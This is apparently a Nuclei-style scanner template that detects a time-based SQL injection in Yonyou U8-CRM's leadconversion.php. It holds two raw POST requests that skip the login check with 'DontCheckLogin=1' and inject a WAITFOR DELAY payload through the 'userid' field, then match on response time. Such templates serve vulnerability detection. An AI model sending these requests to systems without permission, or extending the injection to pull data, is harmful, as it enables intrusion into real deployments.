id: poc-yaml-yongyon-u8-crm-leadconversion-sqli
info:
  name: 用友U8-CRM leadconversion.php SQL注入
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: 用友U8+CRM

variables:
  t1: "{{rand_int(5,9)}}"
  t2: "{{to_number(t1)+2}}"
  t3: "{{rand_int(1,4)}}"
  t4: "{{to_number(t3)+2}}"

http:
  - raw:
      - |
        POST /lead/leadconversion.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bgsesstimeout-;
        Content-Type: application/x-www-form-urlencoded

        DontCheckLogin=1&Action=getDeptName&userid=1%27;WAITFOR+DELAY+%270:0:{{t1}}%27--
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "\"dept_name\":"
          - "\"dept_id\":"
        part: body
      - type: dsl
        dsl:
          - "status_code == 200"
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"

  - raw:
      - |
        POST /lead/leadconversion.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bgsesstimeout-;
        Content-Type: application/x-www-form-urlencoded

        DontCheckLogin=1&Action=getDeptName&userid=1%27;WAITFOR+DELAY+%270:0:{{t3}}%27--
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "\"dept_name\":"
          - "\"dept_id\":"
        part: body
      - type: dsl
        dsl:
          - "status_code == 200"
          - "duration >= to_number(t3)"
          - "duration <= to_number(t4)"
